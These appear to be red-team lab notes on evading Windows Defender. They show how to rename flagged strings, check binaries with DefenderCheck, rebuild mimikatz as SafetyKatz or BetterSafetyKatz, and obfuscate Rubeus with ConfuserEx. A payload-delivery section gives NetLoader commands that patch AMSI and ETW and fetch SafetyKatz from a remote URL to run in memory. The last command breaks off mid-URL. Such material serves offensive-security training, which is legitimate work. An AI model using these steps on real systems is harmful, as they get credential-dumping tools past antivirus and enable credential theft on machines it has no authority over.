- We will focus on bypass of signature based detection by Windows Defender.
- For that, we can use techniques like Obfuscation, String Manipulation, etc.
- We can use **DefenderCheck** (https://github.com/matterpreter/DefenderCheck) to identify code and strings from a binary that windows defender may flag.
- This helps us in deciding on modifying the source code and minimal obfuscation.


How to Manipulate Strings?
- Open the project in Visual Studio
- Press "Ctrl + H"
- Find and replace the string "Credentials" with "Credents" or other
- Select the scope as "Entire Solution"
- Press "Replace ALL"
- Build and recheck the binary with DefenderCheck.
- Repeat above steps if still there is detection

**Safetykatz** (Rebuilds) , we used the follwing steps
- Download the latest version of mimikatz and Out-CompressedDLL.ps1
- Run the Out-CompressedDLL.ps1 Powershell script on Mimikatz binary and save the output to a file.
`Out-CompressedDLL.ps1 <path to mimikatz.exe> > output.txt`

**BetterSafetyKatz** (Rebuilds)
- Download the latest release of "mimikatz_trunk.zip" file.
- Convert the file into base64 value.

Passed it to the zip stream and then rebuilt it.

- For Rubeus.exe, we used ConfuserEx to obfuscate the binary. then we check it with DefenderCheck.exe

## Payload Delivery
- We can use NetLoader (https://github.com/Flangvik/NetLoader) to deliver our binary payloads.
- It can be used to load binary from filepath or URL and patch AMSI and ETW while executing
```powershell
C:\User\Public\Loader.exe -Path
http://192.168.100.x/SafetyKatz.exe
```
- We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a filepath or URl.
```powershell
C:\\Users\Public\AssemblyLoad.exe
http://192.168.100.
```
